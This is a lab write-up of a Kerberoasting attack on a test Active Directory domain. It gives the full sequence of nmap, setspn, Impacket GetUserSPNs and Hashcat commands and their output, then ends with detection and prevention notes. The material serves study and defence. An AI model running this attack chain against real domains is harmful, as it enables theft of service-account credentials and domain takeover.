# Kerberoasting Active Directory Attack

## Overview

Performed a full Kerberoasting attack against a Windows Server 2016 Active Directory environment running on the lab's ESXi host. The attack involved enumerating Service Principal Names, capturing a TGS ticket hash, and cracking it offline using Hashcat — the complete attack chain as it would be executed in a real engagement.

---

## Environment

| Item | Details |
|------|---------|
| Target | Windows Server 2016 Domain Controller |
| Domain | MSIC (msic.com) |
| DC Hostname | CIC-AD1 |
| DC IP | 192.168.137.10 |
| Attack Machine | Kali Linux VM (192.168.137.100) |
| Tools | Impacket, Hashcat, Nmap |

---

## What is Kerberoasting?

Kerberoasting is an Active Directory attack technique that exploits the Kerberos authentication protocol. Any authenticated domain user can request a Kerberos TGS (Ticket Granting Service) ticket for any account that has a Service Principal Name (SPN) registered. These tickets are encrypted with the service account's password hash — meaning they can be taken offline and cracked without any interaction with the target account or any lockout risk.

In real engagements, service accounts are high value targets because they often have:
- Weak or never-rotated passwords
- Excessive privileges (sometimes Domain Admin)
- SPNs registered for legitimate services

---

## Reconnaissance

### Port Scan

Verified the DC was reachable and confirmed key Kerberos/AD ports were open:

```bash
nmap -sV -p 88,389,445,636 192.168.137.10
```

Output confirmed:
- Port 88 — Kerberos
- Port 389 — LDAP (Domain: msic.com)
- Port 445 — SMB
- Host: CIC-AD1, OS: Windows Server

### Domain Enumeration

From the DC itself, enumerated domain users and groups:

```cmd
net user /domain
net group /domain
net group "Domain Admins" /domain
```

**Key findings:**
- Domain users: `Administrator`, `cicdb`, `cicprod`, `krbtgt`
- Domain Admins: `Administrator`, `cicprod`
- `cicprod` — service account with Domain Admin privileges (critical misconfiguration)

### SPN Enumeration

```cmd
setspn -T MSIC -Q */*
```

Found SPNs registered on computer accounts (`CICDB01`, `VSNETLAB1`) but no user accounts with SPNs — Kerberoasting requires SPNs on user accounts.

---

## Setting Up the Target

To simulate a realistic Kerberoastable service account, registered an SPN on the `cicdb` user account:

```cmd
setspn -a MSSQLSvc/fake-sql.msic.com:1433 cicdb
```

This mimics a common real-world scenario where a SQL Server service account has an SPN registered.

Set a known weak password on `cicdb` for cracking practice:

```cmd
net user cicdb Password1
```

---

## Attack Execution

### Configure DNS

Pointed Kali's DNS resolver to the DC so domain names resolve correctly:

```bash
echo "nameserver 192.168.137.10" | sudo tee /etc/resolv.conf
```

### Kerberoasting with Impacket

Used Impacket's `GetUserSPNs` to authenticate to the domain and request TGS tickets for all accounts with SPNs:

```bash
impacket-GetUserSPNs msic.com/Administrator:password@123 -dc-ip 192.168.137.10 -request
```

**Output:**

```
ServicePrincipalName            Name   MemberOf  PasswordLastSet              LastLogon
------------------------------  -----  --------  ---------------------------  ---------
MSSQLSvc/fake-sql.msic.com:1433 cicdb            2020-02-05 13:54:08.330174   <never>

$krb5tgs$23$*cicdb$MSIC.COM$msic.com/cicdb*$6127b03d...
```

Successfully captured a `$krb5tgs$23$` (RC4-HMAC) hash for the `cicdb` account.

> **Note:** Encountered a `KRB_AP_ERR_SKEW` error (clock skew too great) on the first attempt. Kerberos requires clocks to be within 5 minutes of each other. Resolved by manually syncing the Kali system time to match the DC.

---

## Offline Hash Cracking

Saved the captured hash to a file:

```bash
echo '$krb5tgs$23$*cicdb$MSIC.COM...' > cicdb.hash
```

Cracked using Hashcat with the rockyou wordlist:

```bash
hashcat -m 13100 cicdb.hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
Status: Cracked
Hash: $krb5tgs$23$*cicdb$MSIC.COM...:Password1
```

Hash cracked in under 1 second. Recovered plaintext password: `Password1`

---

## Impact Assessment

With the cracked `cicdb` credentials an attacker could:
- Authenticate to any service where `cicdb` has access
- Use the credentials for lateral movement across the domain
- If `cicdb` had admin rights — immediate privilege escalation

The `cicprod` account (Domain Admin + service account) represents an even higher value target in this environment — a real attacker would prioritize cracking that account's hash for full domain compromise.

---

## Defensive Notes

**How to detect Kerberoasting:**
- Monitor for Event ID 4769 (Kerberos service ticket request) with encryption type 0x17 (RC4) — legitimate services typically use AES
- Unusual volume of TGS requests from a single account

**How to prevent:**
- Use strong, long, randomly generated passwords for service accounts (25+ characters makes cracking infeasible)
- Use Group Managed Service Accounts (gMSA) — passwords are automatically rotated by AD
- Enable AES encryption for Kerberos — RC4 hashes are significantly faster to crack
- Audit and remove unnecessary SPNs
- Never assign Domain Admin to service accounts

---

## Lessons Learned

- Kerberoasting requires no special privileges — any authenticated domain user can execute the attack
- Clock synchronization between attacker and DC is critical for Kerberos to work
- Service accounts with weak passwords and SPNs are extremely common in real environments
- RC4 encrypted TGS tickets crack significantly faster than AES — always check encryption type
- `cicprod` having Domain Admin privileges is a textbook AD misconfiguration seen constantly in real engagements

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| setspn | SPN enumeration and registration (Windows) |
| Impacket GetUserSPNs | TGS ticket request and hash capture |
| Hashcat (-m 13100) | Offline Kerberos TGS hash cracking |
| rockyou.txt | Password wordlist |
